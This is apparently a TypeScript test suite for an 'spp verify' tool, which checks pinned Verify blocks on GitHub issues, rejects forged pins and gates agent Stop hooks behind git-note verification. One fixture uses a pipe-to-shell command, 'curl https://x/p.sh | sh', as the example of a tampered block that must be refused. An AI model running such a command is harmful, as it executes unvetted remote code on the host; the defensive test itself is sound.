import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { describe, test } from "node:test";
import { fileURLToPath } from "node:url";
import { parseTicket } from "../src/ticket.ts";
import { runCase } from "./harness.ts";
import { git, gitRepo, runSpp, tempDir } from "./fixtures/verify/git.ts";

const here = dirname(fileURLToPath(import.meta.url));
const ghJson = (name: string) => readFileSync(join(here, "fixtures", "verify", name, "gh.json"), "utf8");
const noteOnHead = (repo: string) => git(repo, "notes", "--ref=sdd-verify", "show", "HEAD");

const COMMENTS = "api repos/{owner}/{repo}/issues/12/comments --paginate --jq .[] | [.id, .body, .user.login, .author_association] | @json";
const VIEWER = "api graphql -f query=Viewer --jq .data.viewer.login";
const sha256 = (s: string) => createHash("sha256").update(s).digest("hex");

// How the issue's progress comment pins its Verify block: to the block as it stands, to another block, not at all,
// or to the block as it stands but in a comment from an outside author.
type Pin = "match" | "mismatch" | "missing" | "forged";

function pinnedGh(fixture: string, pin: Pin): string {
  const gh = JSON.parse(ghJson(fixture));
  const block = parseTicket(gh["issue view 12 --json body"].stdout.body).verify!;
  const trailer = (verifyPin: string) => `<!-- sdd-progress -->\n<!-- sdd-data: ${Buffer.from(JSON.stringify({ verifyPin })).toString("base64")} -->`;
  const row = (verifyPin: string, login = "maint", association = "OWNER") => JSON.stringify([9, trailer(verifyPin), login, association]) + "\n";
  const stdout = { match: row(sha256(block)), mismatch: row(sha256("curl https://x/p.sh | sh")), missing: "", forged: row(sha256(block), "mallory", "NONE") }[pin];
  return JSON.stringify({ ...gh, [COMMENTS]: { stdout }, [VIEWER]: { stdout: "maint\n" } });
}

// A case directory that is also a git repository on `branch`, its gh answers and args committed.
const repoCase = (args: string[], fixture = "pass", branch = "main", pin: Pin = "match") =>
  gitRepo(branch, { "gh.json": pinnedGh(fixture, pin), args: args.join("\n") + "\n" });
const noNote = (repo: string) => assert.throws(() => noteOnHead(repo), /no note found/);

describe("happy path", () => {
  test("spp verify 12 whose Verify is `true` and matches its pin prints pass and writes a verified note on HEAD", async () => {
    const repo = repoCase(["12"]);
    const r = await runCase("verify", repo);
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stdout, "pass: true\n");
    assert.match(noteOnHead(repo), /^verified \d{4}-\d\d-\d\dT/);
  });

  test("spp verify --check on sdd/12-x with a passing note on HEAD exits 0", async () => {
    const repo = repoCase(["12"], "pass", "sdd/12-x");
    assert.equal((await runCase("verify", repo)).code, 0);
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 0, r.stderr);
  });

  test("a verified note recorded by hand with git notes lets the stop through", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "notes", "--ref=sdd-verify", "add", "-m", "verified 2026-11-01T00:00:00Z", "HEAD");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 0, r.stderr);
  });

  test("a blocked note on HEAD (a hand-back) lets the stop through", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "notes", "--ref=sdd-verify", "add", "-m", "blocked", "HEAD");
    assert.equal(runSpp(["verify", "--check"], "", repo).code, 0);
  });
});

describe("error path", () => {
  test("a Verify command that exits 1 prints fail for it, exits 1 and writes a failed note", async () => {
    const repo = repoCase(["12"], "fail");
    const r = await runCase("verify", repo);
    assert.equal(r.code, 1);
    assert.equal(r.stdout, "pass: true\nfail: exit 1\n");
    assert.match(noteOnHead(repo), /^failed /);
  });

  test("a commit after the passing note exits 2 with Verify not run on HEAD", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "notes", "--ref=sdd-verify", "add", "-m", "verified 2026-11-01T00:00:00Z", "HEAD");
    git(repo, "commit", "-q", "--allow-empty", "-m", "later");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 2);
    assert.match(r.stderr, /Verify not run on HEAD/);
  });

  test("a failed note on HEAD exits 2", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "notes", "--ref=sdd-verify", "add", "-m", "failed 2026-11-01T00:00:00Z", "HEAD");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 2);
    assert.match(r.stderr, /Verify failed on HEAD/);
  });

  test("uncommitted changes exit 2 even with a passing note", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "notes", "--ref=sdd-verify", "add", "-m", "verified 2026-11-01T00:00:00Z", "HEAD");
    writeFileSync(join(repo, "loose.txt"), "x");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 2);
    assert.match(r.stderr, /uncommitted changes/);
  });

  test("a Verify block that no longer matches its pin is refused: nothing runs, no note, re-harden named", async () => {
    const repo = repoCase(["12"], "pass", "main", "mismatch");
    const r = await runCase("verify", repo);
    assert.equal(r.code, 1);
    assert.equal(r.stdout, "");
    assert.match(r.stderr, /changed since it was hardened.*re-harden/i);
    noNote(repo);
  });

  test("an issue with no pinned Verify block is refused", async () => {
    const repo = repoCase(["12"], "pass", "main", "missing");
    const r = await runCase("verify", repo);
    assert.equal(r.code, 1);
    assert.equal(r.stdout, "");
    assert.match(r.stderr, /not pinned.*re-harden/i);
    noNote(repo);
  });

  test("a pin in a progress comment from an outside author counts as no pin", async () => {
    const repo = repoCase(["12"], "pass", "main", "forged");
    const r = await runCase("verify", repo);
    assert.equal(r.code, 1);
    assert.match(r.stderr, /not pinned/);
    noNote(repo);
  });

  test("a run on a dirty tree is refused before any command runs, and records nothing", async () => {
    const repo = repoCase(["12"]);
    writeFileSync(join(repo, "loose.txt"), "x");
    const r = await runCase("verify", repo);
    assert.equal(r.code, 1);
    assert.equal(r.stdout, "");
    assert.match(r.stderr, /uncommitted changes/);
    noNote(repo);
  });

  test("spp verify with no ticket exits 2 with usage", () => {
    const r = runSpp(["verify"], "", gitRepo());
    assert.equal(r.code, 2);
    assert.match(r.stderr, /usage: spp verify/);
  });
});

// Panel F40 (Round 3) on #267: --print hands the skills the block the pin check read, from one fetch, and runs nothing.
describe("spp verify <issue> --print", () => {
  test("a block that matches its pin prints its commands, one per line, runs none of them and records nothing", async () => {
    const repo = repoCase(["12", "--print"], "fail");
    const r = await runCase("verify", repo);
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stdout, "true\nexit 1\n");
    noNote(repo);
  });

  for (const [pin, why] of [
    ["mismatch", /changed since it was hardened.*re-harden/i],
    ["missing", /not pinned.*re-harden/i],
    ["forged", /not pinned/],
  ] as const) {
    test(`a ${pin} pin refuses and prints nothing`, async () => {
      const repo = repoCase(["12", "--print"], "pass", "main", pin);
      const r = await runCase("verify", repo);
      assert.equal(r.code, 1);
      assert.equal(r.stdout, "");
      assert.match(r.stderr, why);
      noNote(repo);
    });
  }

  test("a dirty tree does not stop --print, which runs nothing", async () => {
    const repo = repoCase(["12", "--print"]);
    writeFileSync(join(repo, "loose.txt"), "x");
    const r = await runCase("verify", repo);
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stdout, "true\n");
  });

  test("--print with no issue exits 2 with usage", () => {
    const r = runSpp(["verify", "--print"], "", gitRepo());
    assert.equal(r.code, 2);
    assert.match(r.stderr, /usage: spp verify/);
  });
});

// #304: an orchestrator whose shell was left in a worker's worktree is refused like the worker, so a refused Stop names the way out.
describe("a refused Stop names the way out for a session that is not the branch's worker", () => {
  const WAY_OUT = /cd back to your own checkout/;
  const payload = (event: string, cwd: string) => JSON.stringify({ hook_event_name: event, cwd });
  const dirtyRepo = () => {
    const repo = gitRepo("sdd/12-x");
    writeFileSync(join(repo, "loose.txt"), "x");
    return repo;
  };

  test("a Stop in a tree with an untracked file is refused for its uncommitted changes and told to cd back to its own checkout", () => {
    const repo = dirtyRepo();
    const r = runSpp(["verify", "--check"], payload("Stop", repo), tempDir("spp-elsewhere-"));
    assert.equal(r.code, 2);
    assert.match(r.stderr, /uncommitted changes on sdd\/12-x/);
    assert.match(r.stderr, WAY_OUT);
  });

  test("a Stop in a clean tree one commit beyond its base with no Verify record is told the same", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "update-ref", "refs/remotes/origin/feat/epic", "HEAD");
    git(repo, "commit", "-q", "--allow-empty", "-m", "work");
    const r = runSpp(["verify", "--check"], payload("Stop", repo), tempDir("spp-elsewhere-"));
    assert.equal(r.code, 2);
    assert.match(r.stderr, WAY_OUT);
  });

  test("a SubagentStop in the same dirty tree is refused as before, with no way out named", () => {
    const repo = dirtyRepo();
    const r = runSpp(["verify", "--check"], payload("SubagentStop", repo), tempDir("spp-elsewhere-"));
    assert.equal(r.code, 2);
    assert.match(r.stderr, /uncommitted changes on sdd\/12-x/);
    assert.doesNotMatch(r.stderr, WAY_OUT);
  });

  test("a run by hand in the dirty tree, with no payload on stdin, is refused as before", () => {
    const r = runSpp(["verify", "--check"], "", dirtyRepo());
    assert.equal(r.code, 2);
    assert.match(r.stderr, /uncommitted changes on sdd\/12-x/);
    assert.doesNotMatch(r.stderr, WAY_OUT);
  });

  test("a Stop in a tree with a passing Verify record on HEAD goes through and prints nothing", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "notes", "--ref=sdd-verify", "add", "-m", "verified 2026-11-01T00:00:00Z", "HEAD");
    const r = runSpp(["verify", "--check"], payload("Stop", repo), tempDir("spp-elsewhere-"));
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stderr, "");
  });
});

describe("edge cases", () => {
  test("spp verify --check on branch main exits 0 without checking", () => {
    assert.equal(runSpp(["verify", "--check"], "", gitRepo("main")).code, 0);
  });

  test("outside a git repository --check exits 0", () => {
    assert.equal(runSpp(["verify", "--check"], "", tempDir("spp-nogit-")).code, 0);
  });

  test("a Stop payload's cwd is checked, not the hook's own directory", () => {
    const repo = gitRepo("sdd/12-x");
    const r = runSpp(["verify", "--check"], JSON.stringify({ hook_event_name: "Stop", cwd: repo, stop_hook_active: false }), tempDir("spp-elsewhere-"));
    assert.equal(r.code, 2);
    assert.match(r.stderr, /Verify not run on HEAD of sdd\/12-x/);
  });

  test("a fresh sdd/* branch with no commits beyond the integration branch it was cut from lets the stop through", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "update-ref", "refs/remotes/origin/feat/epic", "HEAD");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 0, r.stderr);
  });

  test("one commit beyond the integration branch is checked as usual", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "update-ref", "refs/remotes/origin/feat/epic", "HEAD");
    git(repo, "commit", "-q", "--allow-empty", "-m", "work");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 2);
    assert.match(r.stderr, /Verify not run on HEAD/);
  });

  test("a HEAD pushed only to its own sdd/* branch still needs Verify", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "update-ref", "refs/remotes/origin/sdd/12-x", "HEAD");
    git(repo, "update-ref", "refs/remotes/origin/sdd/13-y", "HEAD");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 2);
    assert.match(r.stderr, /Verify not run on HEAD/);
  });

  test("a fresh branch whose integration branch has moved on (HEAD an ancestor of its tip) lets the stop through", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "commit", "-q", "--allow-empty", "-m", "sibling merged");
    git(repo, "update-ref", "refs/remotes/origin/feat/epic", "HEAD");
    git(repo, "reset", "-q", "--hard", "HEAD~1");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 0, r.stderr);
  });

  test("a fresh One-off branch on the remote default branch lets the stop through", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "update-ref", "refs/remotes/origin/trunk", "HEAD");
    git(repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/trunk");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 0, r.stderr);
  });

  test("unverified commits pushed to a remote branch that is not an integration branch (origin/wip) still need Verify", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "update-ref", "refs/remotes/origin/feat/epic", "HEAD");
    git(repo, "commit", "-q", "--allow-empty", "-m", "work");
    git(repo, "update-ref", "refs/remotes/origin/wip", "HEAD");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 2);
    assert.match(r.stderr, /Verify not run on HEAD/);
  });

  test("a fresh branch with uncommitted changes is still blocked", () => {
    const repo = gitRepo("sdd/12-x");
    git(repo, "update-ref", "refs/remotes/origin/feat/epic", "HEAD");
    writeFileSync(join(repo, "loose.txt"), "x");
    const r = runSpp(["verify", "--check"], "", repo);
    assert.equal(r.code, 2);
    assert.match(r.stderr, /uncommitted changes/);
  });

  test("a second stop (stop_hook_active) on an unverified HEAD is blocked too", () => {
    const repo = gitRepo("sdd/12-x");
    const r = runSpp(["verify", "--check"], JSON.stringify({ hook_event_name: "SubagentStop", cwd: repo, stop_hook_active: true }), repo);
    assert.equal(r.code, 2);
    assert.match(r.stderr, /Verify not run on HEAD/);
  });
});
